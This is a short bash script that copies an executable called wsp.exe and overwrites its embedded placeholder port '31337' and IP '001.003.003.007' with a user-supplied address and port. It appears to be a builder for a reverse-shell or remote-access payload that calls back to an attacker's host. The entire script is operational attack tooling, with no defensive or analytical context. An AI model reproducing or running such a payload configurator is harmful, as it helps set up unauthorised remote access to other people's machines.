#!/bin/bash

if [ -z $4 ]; then
	echo 'Expected arguments /path/to/wsp.exe /path/to/output/file ipaddr port'
fi
cp $1 $2

OFFSET_PORT=$( strings -a -t d $1 | grep '31337' | tr -s ' ' | cut -d ' ' -f2 )
OFFSET_IP=$( strings -a -t d $1 | grep '001.003.003.007' | tr -s ' ' | cut -d ' ' -f2 )

echo "Offset of port at $OFFSET_PORT."
echo "Offset of ip at $OFFSET_IP."

echo 'Ensuring null termination'
dd if=/dev/zero of=$2 count=5 bs=1 seek=$OFFSET_PORT conv=notrunc
dd if=/dev/zero of=$2 count=15 bs=1 seek=$OFFSET_IP conv=notrunc

echo 'Patching port'
echo -n $4 > $2.tmp
dd if="$2.tmp" of=$2 count=5 bs=1 seek=$OFFSET_PORT conv=notrunc

echo 'Patching ip'
echo -n $3 > $2.tmp
dd if="$2.tmp" of=$2 count=15 bs=1 seek=$OFFSET_IP conv=notrunc
rm "$2.tmp"

echo "$2 is ready!"
